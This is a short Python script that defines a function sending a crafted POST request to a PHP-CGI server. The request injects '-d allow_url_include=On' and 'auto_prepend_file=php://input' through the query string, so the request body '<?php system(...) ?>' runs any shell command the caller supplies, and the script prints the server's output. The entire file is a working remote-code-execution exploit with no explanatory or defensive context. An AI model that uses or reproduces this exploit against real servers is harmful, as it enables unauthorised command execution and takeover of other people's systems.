import requests


def php(url, command):
    response = requests.post(
        url + "?-d+allow_url_include%3DOn+-d+auto_prepend_file%3Dphp://input",
        "<?php system('" + command + "'); ?>"
    )
    print(response.text)
